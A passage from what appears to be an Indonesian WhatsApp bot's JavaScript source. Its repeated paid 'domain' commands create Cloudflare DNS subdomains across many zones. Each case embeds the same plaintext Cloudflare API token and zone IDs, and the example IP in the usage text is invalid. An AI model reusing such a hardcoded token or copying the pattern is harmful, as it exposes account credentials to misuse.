                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8fda718f07621d32f906f1cc9938358";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain5': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d877d9cf996ac8a1b371851e733ba20e";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f58970b468ab2eb4c3a546c0e37680e0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDU OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain7': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain8': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "deb75eb2d37b30e954684a3db7f1e323";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannelku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain13': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain14': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
